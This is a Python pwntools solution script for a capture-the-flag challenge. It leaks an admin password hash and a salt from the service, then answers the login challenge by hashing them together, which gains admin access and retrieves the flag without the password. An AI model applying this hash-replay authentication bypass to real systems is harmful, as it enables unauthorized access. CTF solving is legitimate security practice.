from pwn import *
from hashlib import sha3_256
host,port = 'puzzler7.imaginaryctf.org',7331
try:
    p = remote(host,port)
    lines = p.recvuntil(b'>>> ').decode()
    p.clean()
    p.sendline(b'\x7f')
    p.recvuntil(b'!\n\n')
    lines = p.recvuntil(b'continue.\n')
    lines = lines.split(b'\n')
    user,passw = lines[0].split(b':')

    # read the admin password hash
    passw = passw.lstrip()

    # read the salt
    special = lines[8][lines[8].index(b'(\'')+2:lines[8].index(b'\')')]
    
    p.clean()
    p.sendline(b'\n')
    p.recvuntil(b'>>> ').decode()
    p.sendline(b'1')
    p.recv().decode()
    p.sendline(b'admin')
    
    # read the challenge
    r = p.recvuntil(b') + \'')
    r = p.recvuntil(b'\')')[:-2]

    # calculate a response
    cracked = sha3_256(passw+r+special).hexdigest().encode()

    # send the challenge response
    p.sendline(cracked)
    p.recvuntil(b'>>> ')

    # get flag
    p.sendline(b'3')
    flag = p.recvline().decode()
    print(f'flag: {flag}')

    # logout and close connection
    p.sendline(b'4')
    p.close()
except Exception as e:
    print(f'Exception: {e}')
